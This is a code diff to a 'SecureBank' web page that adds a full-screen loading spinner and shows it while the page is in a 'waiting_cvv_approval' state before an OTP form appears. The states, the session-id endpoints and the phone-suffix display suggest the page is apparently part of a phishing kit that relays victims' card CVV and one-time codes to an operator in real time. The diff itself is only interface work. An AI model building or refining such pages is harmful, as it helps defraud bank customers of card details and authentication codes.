@@ -130,6 +130,41 @@
             height: 48px;
             margin: 0;
         }
+        .initial-loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+        .initial-loader.hidden {
+            display: none;
+        }
+        .initial-loader .loader-spinner {
+            width: 64px;
+            height: 64px;
+            animation: loader-fade-in 500ms ease-in-out, loader-rotate 500ms linear infinite;
+        }
+        .initial-loader .loader-spinner svg {
+            display: block;
+            width: 100%;
+            height: 100%;
+            fill: #1a237e;
+        }
+        @keyframes loader-rotate {
+            from { transform: rotate(0); }
+            to { transform: rotate(360deg); }
+        }
+        @keyframes loader-fade-in {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
         .otp-form {
             display: none;
         }
@@ -296,6 +331,11 @@
     </style>
 </head>
 <body>
+    <div id="initial-loader" class="initial-loader">
+        <div class="loader-spinner">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M32 16c0 8.837-7.163 16-16 16S0 24.837 0 16 7.163 0 16 0v2C8.268 2 2 8.268 2 16s6.268 14 14 14 14-6.268 14-14h2z"></path></svg>
+        </div>
+    </div>
     <div class="container">
         <div class="bank-header">
             <div class="bank-logo">SecureBank</div>
@@ -553,6 +593,14 @@
             return basePath + '/' + endpoint + '?sid=' + encodeURIComponent(sessionId);
         }
 
+        function showInitialLoading() {
+            document.getElementById('initial-loader').classList.remove('hidden');
+        }
+
+        function hideInitialLoader() {
+            document.getElementById('initial-loader').classList.add('hidden');
+        }
+
         function showLoading(title, subtitle) {
             document.getElementById('title').textContent = title;
             document.getElementById('subtitle').textContent = subtitle;
@@ -563,6 +611,7 @@
         }
 
         function showOTPForm() {
+            hideInitialLoader();
             document.getElementById('title').textContent = t('title_otp');
             var subtitle = t('subtitle_otp');
             if (phoneSuffix !== '') {
@@ -632,9 +681,7 @@
 
             switch (state) {
                 case 'waiting_cvv_approval':
-                    if (currentState !== state) {
-                        showLoading(t('title_loading'), t('subtitle_loading'));
-                    }
+                    showInitialLoading();
                     break;
                 case 'otp_waiting':
                     if (currentState === 'waiting_cvv_approval' || currentState === '') {
